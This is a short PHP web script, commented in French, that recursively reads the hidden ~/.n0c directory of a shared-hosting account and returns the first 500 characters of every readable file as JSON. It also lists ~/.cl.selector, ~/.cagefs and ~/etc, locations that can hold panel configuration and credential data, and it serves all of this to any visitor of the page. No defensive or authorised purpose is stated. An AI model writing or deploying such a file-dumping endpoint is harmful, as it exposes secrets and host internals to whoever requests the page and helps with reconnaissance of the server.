<?php
header('Content-Type: application/json');

$out = [];
$home  = '/home/atqadcksav';
$n0c   = $home . '/.n0c';

// Lister et lire TOUT ce qui est dans ~/.n0c/
$out['n0c_dir'] = [];
$iter = new RecursiveIteratorIterator(
    new RecursiveDirectoryIterator($n0c, RecursiveDirectoryIterator::SKIP_DOTS),
    RecursiveIteratorIterator::SELF_FIRST
);
foreach ($iter as $path => $info) {
    if ($info->isFile() && $info->isReadable()) {
        $out['n0c_dir'][$path] = substr(file_get_contents($path), 0, 500);
    } elseif ($info->isDir()) {
        $out['n0c_dir_dirs'][] = $path;
    }
}

// Si le dossier est vide ou inaccessible, essayer glob
if (empty($out['n0c_dir'])) {
    $out['n0c_glob']  = @glob($n0c . '/*') ?: [];
    $out['n0c_glob2'] = @glob($n0c . '/.*') ?: [];
    // Lire directement chaque fichier trouvé
    foreach (array_merge($out['n0c_glob'], $out['n0c_glob2']) as $f) {
        if (@is_file($f) && @is_readable($f)) {
            $out['n0c_files'][$f] = substr(@file_get_contents($f), 0, 500);
        }
    }
}

// Cherche aussi dans d'autres endroits
$extra = [
    $home . '/.cl.selector',
    $home . '/.cagefs',
    $home . '/etc',
];
foreach ($extra as $d) {
    if (@is_dir($d)) {
        $files = @scandir($d);
        $out['extra_dirs'][$d] = $files ?: [];
    }
}

echo json_encode($out, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
